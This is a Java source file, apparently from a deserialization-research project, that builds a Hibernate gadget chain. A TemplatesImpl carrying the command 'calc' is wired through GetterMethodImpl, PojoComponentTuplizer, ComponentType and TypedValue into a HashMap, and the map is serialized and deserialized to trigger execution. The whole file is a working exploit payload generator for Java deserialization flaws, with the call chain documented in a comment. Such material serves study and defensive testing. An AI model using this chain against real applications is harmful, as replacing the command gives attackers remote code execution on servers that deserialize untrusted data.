package Seri.HibernateGadgets;

import Seri.ReflectDemo.Person;
import Seri.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.hibernate.property.access.spi.Getter;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import sun.reflect.ReflectionFactory;
import org.hibernate.property.access.spi.GetterMethodImpl;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.ComponentMetamodel;
import org.hibernate.type.ComponentType;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Hibernate1 {
    /**
     * org.hibernate.property.access.spi.GetterMethodImpl.get()
     * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
     * org.hibernate.type.ComponentType.getPropertyValue(C)
     * org.hibernate.type.ComponentType.getHashCode()
     * org.hibernate.engine.spi.TypedValue$1.initialize()
     * org.hibernate.engine.spi.TypedValue$1.initialize()
     * org.hibernate.internal.util.ValueHolder.getValue()
     * org.hibernate.engine.spi.TypedValue.hashCode()
     * @param args
     */
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc");

        Method method = templates.getClass().getMethod("getOutputProperties");

        GetterMethodImpl getterMethod = new GetterMethodImpl(Object.class, "xxx" ,method);

        ComponentType componentType =
                (ComponentType) Utils.createObjectWithoutConstructor(ComponentType.class);

        Utils.setValue(componentType ,"propertySpan" ,2);

        PojoComponentTuplizer pojoComponentTuplizer =
                (PojoComponentTuplizer) Utils.createObjectWithoutConstructor(PojoComponentTuplizer.class);

        Getter[] getters = new Getter[]{getterMethod};
        Field gettersField = AbstractComponentTuplizer.class.getDeclaredField("getters");
        gettersField.setAccessible(true);
        gettersField.set(pojoComponentTuplizer , getters);

        Field propertySpanField = AbstractComponentTuplizer.class.getDeclaredField("propertySpan");
        propertySpanField.setAccessible(true);
        propertySpanField.set(pojoComponentTuplizer , 1);

        Utils.setValue(componentType ,"componentTuplizer" , pojoComponentTuplizer);

        TypedValue typedValue = new TypedValue(componentType ,templates);

        HashMap<Object,Object> map = new HashMap<>();
        map.put(1 ,1);

        Field tableField = HashMap.class.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[]) tableField.get(map);
        for (Object entry: table){
            System.out.println(entry);
            if (entry != null){
                Utils.setValue(entry,"key",typedValue);
            }
            System.out.println(entry);
        }

        Utils.serialize(map,"bin/hibernate.bin");
        Utils.unserialize("bin/hibernate.bin");

    }
}
